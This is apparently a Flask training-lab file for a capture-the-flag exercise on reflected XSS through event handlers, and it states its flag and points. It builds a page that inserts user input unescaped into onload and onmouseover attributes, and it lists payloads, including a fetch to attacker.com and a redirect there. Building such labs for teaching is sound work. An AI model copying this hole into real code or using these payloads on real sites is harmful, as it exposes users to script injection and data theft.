"""
XSS Lab 5: Event Handler XSS
Difficulty: 2 (Intermediate)
Type: Reflected XSS via Event Handlers
Points: 75

Description:
XSS via HTML event handler attributes like onload, onmouseover, onerror.
User input can trigger JavaScript through event handlers.
"""

from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    return """
    <html>
        <head>
            <title>XSS Lab 5: Event Handler XSS</title>
            <style>
                body { font-family: Arial; margin: 40px; }
                .container { max-width: 600px; background: #f5f5f5; padding: 20px; border-radius: 5px; }
                input { padding: 8px; width: 250px; }
                button { padding: 8px 15px; background: #007bff; color: white; border: none; cursor: pointer; }
            </style>
        </head>
        <body>
            <h1>Lab 5: Event Handler XSS</h1>
            
            <div class="container">
                <h3>Image Gallery:</h3>
                <form action="/image" method="GET">
                    <input type="text" name="title" placeholder="Image title">
                    <button type="submit">Load Image</button>
                </form>
            </div>
            
            <p><strong>Flag:</strong> FLAG{xss_event_handler_005}</p>
        </body>
    </html>
    """

@app.route('/image', methods=['GET'])
def image():
    """
    Vulnerable image loader with event handler injection
    """
    title = request.args.get('title', 'Image Gallery')
    
    # VULNERABLE: User input in img tag with onload attribute
    html = f"""
    <html>
        <head>
            <title>Image Viewer</title>
            <style>
                body {{ font-family: Arial; margin: 40px; }}
                img {{ max-width: 500px; border: 1px solid #ddd; }}
            </style>
        </head>
        <body>
            <h1>{title}</h1>
            
            <!-- VULNERABLE: User input in onload event -->
            <img src="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22%3E%3C/svg%3E" onload="console.log('{title}')">
            
            <!-- More vulnerable variations -->
            <div onmouseover="alert('{title}')">Hover over this div</div>
            
            <h3>Payload Examples:</h3>
            <ul>
                <li><code>'); alert('XSS'); //</code></li>
                <li><code>'); fetch('http://attacker.com/log'); //</code></li>
                <li><code>'); document.location='http://attacker.com'; //</code></li>
                <li><code>' onmouseover='alert("XSS")</code></li>
            </ul>
            
            <p><a href="/">Back to home</a></p>
        </body>
    </html>
    """
    
    return html

if __name__ == '__main__':
    app.run(debug=True, port=5005)
